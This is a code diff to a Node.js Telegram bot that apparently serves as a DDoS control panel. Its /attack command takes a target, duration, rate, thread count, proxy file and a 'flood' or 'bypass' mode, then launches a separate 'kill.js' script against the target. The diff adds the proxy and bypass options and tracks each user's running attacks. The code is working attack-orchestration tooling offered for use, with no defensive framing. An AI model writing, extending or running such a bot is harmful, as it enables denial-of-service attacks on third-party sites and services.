@@ -40,29 +40,27 @@ bot.onText(/\/system/, async (msg) => {
   if (!isAdmin && !isGroupActive) return
 
   try {
-    const [cpu, mem, disk, os, network, processes, memLayout] = await Promise.all([
+    const [cpu, mem, disk, os, network, processes, cpuCurrentSpeed] = await Promise.all([
       si.cpu(),
       si.mem(),
       si.fsSize(),
       si.osInfo(),
       si.networkInterfaces(),
       si.processes(),
-      si.memLayout()
+      si.currentLoad()
     ])
     const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
     const networkInfo = network.length > 0 ? network[0] : { iface: 'N/A', ip4: 'N/A' }
-    const swapTotal = memLayout.reduce((sum, m) => sum + (m.swapTotal || 0), 0)
-    const swapUsed = memLayout.reduce((sum, m) => sum + (m.swapUsed || 0), 0)
     const systemInfo = {
       os: `${os.distro} ${os.release} (${os.arch})`,
       kernel: os.kernel,
       hostname: os.hostname,
       cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
+      cpuLoad: `${cpuCurrentSpeed.currentLoad.toFixed(2)}%`,
       ram: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
       disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
       network: `${networkInfo.iface} (${networkInfo.ip4})`,
-      activeProcesses: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None',
-      swap: `${(swapTotal / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(swapUsed / 1024 / 1024 / 1024).toFixed(2)} GB used`
+      activeProcesses: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None'
     }
     bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
   } catch (err) {
@@ -117,12 +115,12 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    if (args.length !== 4) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (args.length < 4 || args.length > 6) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [target] [time] [rate] [thread] [proxy] [input]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
-    const [target, timeStr, rate, thread] = args
+    const [target, timeStr, rate, thread, proxy = './prx.txt', input = 'flood'] = args
     const time = parseInt(timeStr)
 
     if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
@@ -135,9 +133,21 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'], { stdio: ['ignore', 'pipe', 'pipe'] })
+    if (input !== 'flood' && input !== 'bypass') {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Input must be "flood" or "bypass"' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+
+    try {
+      await fs.access(proxy)
+    } catch (err) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Proxy file not found' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+
+    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, proxy, input], { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null, startTime: Date.now() }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, input, userId, remainingTime: time, messageId: null, startTime: Date.now() }
 
     const response = {
       status: 'Attack Started',
@@ -145,6 +155,8 @@ bot.on('message', async (msg) => {
       time,
       rate,
       thread,
+      proxy,
+      input,
       caller: username,
       index: attackId
     }
@@ -182,6 +194,8 @@ bot.on('message', async (msg) => {
         time: activeAttacks[attackId].remainingTime,
         rate,
         thread,
+        proxy,
+        input,
         caller: username,
         index: attackId
       }
@@ -239,7 +253,9 @@ bot.on('message', async (msg) => {
         target: v.target,
         time: v.remainingTime,
         rate: v.rate,
-        thread: v.thread
+        thread: v.thread,
+        proxy: v.proxy,
+        input: v.input
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
@@ -294,7 +310,7 @@ bot.on('message', async (msg) => {
     }
     delete admins[removeAdminId]
     await saveJson(ADMIN_LIST_PATH, admins)
-    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminRemove: true, fullName: beautiful, idRemovedAdmin: Number(removeAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    bot.sendMessage(id, '```json\n' + JSON.stringify({ adminRemove: true, fullName: removeAdminName, idRemovedAdmin: Number(removeAdminId) }, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
 })
 
